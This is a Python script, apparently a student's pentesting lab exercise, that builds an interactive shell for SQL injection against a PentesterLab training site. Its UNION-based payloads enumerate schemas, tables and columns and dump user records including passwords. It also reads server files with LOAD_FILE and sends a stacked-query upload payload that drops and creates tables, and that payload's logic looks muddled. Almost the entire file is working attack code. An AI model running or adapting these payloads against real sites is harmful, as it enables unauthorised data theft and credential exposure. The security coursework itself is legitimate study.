#!/usr/bin/env python

# Carlos Mendoza - Lab3 Part2 - CSCI4621
# SQL Injection Example 1
# An interactive shell client that takes the IP address of the Pentester Lab site and supports the following commands which allow the user to view aspects of the site's SQL database: dbs, tables, columns, and dump
# Done by injecting SQL command payloads into the url

import sys
import requests
import base64
from urllib.request import urlopen

def interactiveShell():
	# siteIP used to navigate to the correct website based on VM
	global siteIP
	#x = ""
	while True:
		# For each new line in the interactive shell, print "lab3sqli> " to let the user know that they're still in this shell
		# Listen for user input
		inputString = input('lab3sqli> ')
		# Exit the shell client the same way you would bash
		if inputString == "exit":
			print('exiting now...')
			break
		#dbs command
		elif inputString[0] == 'd' and inputString[1] == 'b' and inputString[2] == 's':
			try:
				url = "http://" + siteIP + "/sqli/example1.php?name=root%27+UNION+ALL+SELECT+(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),2,3,4,5--+-"
				page = urlopen(url)
				pageText = page.read()
				pageTextDecoded = pageText.decode("utf-8")
				td_index = pageTextDecoded.find("<td>information_schema<br>")
				start_index = td_index + len("<td>information_schema<br>")
				end_index = pageTextDecoded.find("</td><td>2")
				output = pageTextDecoded[start_index:end_index]
				print("Listed Databases: " + output + "\n")
				#print(pageTextDecoded) This was used to find where the database name was
			except:
				#print(error) is used for debugging here
				print('Invalid Input. Arguments may be incorrect or missing\n')
		#tables <database> command
		elif inputString[0] == 't' and inputString[1] == 'a' and inputString[2] == 'b' and inputString[3] == 'l' and inputString[4] == 'e' and inputString[5] == 's':
			try:
				commandArguments = inputString.split(' ')
				databaseArgument = commandArguments[1]
				url = "http://" + siteIP + "/sqli/example1.php?name=root%27+UNION+ALL+SELECT+(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=%27" + databaseArgument + "%27),2,3,4,5--+-"
				page = urlopen(url)
				pageText = page.read()
				pageTextDecoded = pageText.decode("utf-8")
				td_index = pageTextDecoded.find("30</td></tr><tr><td>")
				start_index = td_index + len("30</td></tr><tr><td>")
				end_index = pageTextDecoded.find("</td><td>2")
				output = pageTextDecoded[start_index:end_index]
				print("Listed Tables for " + databaseArgument + ": " + output + "\n")
				#print(pageTextDecoded)
			except:
				print('Invalid Input. Arguments may be incorrect or missing\n')
		#columns <database> <table> command
		elif inputString[0] == 'c' and inputString[1] == 'o' and inputString[2] == 'l' and inputString[3] == 'u' and inputString[4] == 'm' and inputString[5] == 'n' and inputString[6] == 's':
			try:
				commandArguments = inputString.split(' ')
				databaseArgument = commandArguments[1]
				tableArgument = commandArguments[2]
				url = "http://" + siteIP + "/sqli/example1.php?name=root%27+UNION+ALL+SELECT+(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=%27" + tableArgument + "%27),2,3,4,5--+-"
				page = urlopen(url)
				pageText = page.read()
				pageTextDecoded = pageText.decode("utf-8")
				td_index = pageTextDecoded.find("30</td></tr><tr><td>")
				start_index = td_index + len("30</td></tr><tr><td>")
				end_index = pageTextDecoded.find("</td><td>2")
				output = pageTextDecoded[start_index:end_index]
				output = output.replace("<br>", ", ")
				print("Listed Columns for " + tableArgument + " in " + databaseArgument + ": " + output + "\n")
				#print(pageTextDecoded)			
			except:
				print('Invalid Input. Arguments may be incorrect or missing\n')
		#dump <database> <table> command
		elif inputString[0] == 'd' and inputString[1] == 'u' and inputString[2] == 'm' and inputString[3] == 'p':
			try:
				commandArguments = inputString.split(' ')
				databaseArgument = commandArguments[1]
				tableArgument = commandArguments[2]
				url = "http://" + siteIP + "/sqli/example1.php?name=root%27+UNION+ALL+SELECT+(SELECT+GROUP_CONCAT(%22ID+-+%22,id,%22+|+Name+-+%22,name,%22+|+Age+-+%22,age,%22+|+GroupID+-+%22,groupid,%22+|+Passwd+-+%22,passwd+SEPARATOR+0x3c62723e)+FROM+" + databaseArgument + "." + tableArgument + "),2,3,4,5--+-"
				page = urlopen(url)
				pageText = page.read()
				pageTextDecoded = pageText.decode("utf-8")
				td_index = pageTextDecoded.find("30</td></tr><tr><td>")
				start_index = td_index + len("30</td></tr><tr><td>")
				end_index = pageTextDecoded.find("</td><td>2")
				output = pageTextDecoded[start_index:end_index]
				output = output.replace("<br>", "\n")
				print("Dumped Data from " + tableArgument + " in " + databaseArgument + ": \n" + output + "\n")
				#print(pageTextDecoded)						
			except:
				print('Invalid Input. Arguments may be incorrect or missing\n')
		elif inputString.startswith("download "):
			download(siteIP, inputString.split()[1], inputString.split()[2])
		elif inputString.startswith("upload "):
			upload(siteIP, inputString.split()[1], inputString.split()[2]) 
		else:
			print('Invalid Input\n')
	return

def download(site_ip, remote_file, local_file):
    payload = f"root' UNION ALL SELECT 1,2,3,4,(SELECT LOAD_FILE('{remote_file}') FROM DUAL)-- -"
    response = requests.get(f"http://{site_ip}/sqli/example1.php", params={"name": payload})
    
    if response.status_code == 200:
        with open(local_file, 'wb') as f:
            f.write(response.content)
        print(f"Downloaded remote file: {remote_file} to local file: {local_file}")
    else:
        print(f"Error downloading remote file: {remote_file} to local file: {local_file}")

def upload(site_ip, local_file, remote_file):
    with open(local_file, 'rb') as f:
        encoded_data = base64.b64encode(f.read()).decode('utf-8')
    
    data = {
        "name": f"root'; SELECT 1 FROM DUAL WHERE 1=1 AND 0=IFNULL((SELECT 1 FROM (SELECT 1 UNION SELECT 2) a WHERE 1=1 LIMIT 1),0) AND 1=1; DROP TABLE IF EXISTS temp_tbl; CREATE TABLE temp_tbl (data LONGBLOB); INSERT INTO temp_tbl (data) VALUES (FROM_BASE64('{encoded_data}')); SELECT @result:=LOAD_FILE('{remote_file}'); DELETE FROM temp_tbl; INSERT INTO temp_tbl (data) VALUES (@result); SELECT 1;"
    }
    
    response = requests.post(f"http://{site_ip}/sqli/example1.php", data=data)
    
    if response.status_code == 200:
        print(f"Uploaded local file: {local_file} to remote file: {remote_file}")
    else:
        print(f"Error uploading local file: {local_file} to remote file: {remote_file}")

if __name__ == "__main__":
	args = sys.argv[1:]
	# In my case, the IP address of the pentester lab site, using ifconfig in the VM, was 192.168.56.101
	siteIP = args[0]
	interactiveShell()